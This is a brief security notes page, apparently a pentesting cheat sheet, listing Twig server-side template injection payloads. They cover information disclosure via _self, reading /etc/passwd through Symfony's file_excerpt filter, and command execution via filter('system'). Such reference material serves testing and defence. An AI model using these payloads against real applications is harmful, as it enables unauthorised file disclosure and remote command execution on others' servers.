---
title: d-Twig
draft: false
tags:
  - ssti
  - twig
---
## Information Disclosure

In Twig, we can use the `_self` keyword to obtain a little information about the current template:

```twig
{{ _self }}
```

## LFI

PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

## RCE

To achieve remote code execution, we can use a PHP built-in function such as `system`.

```twig
{{ ['id'] | filter('system') }}
```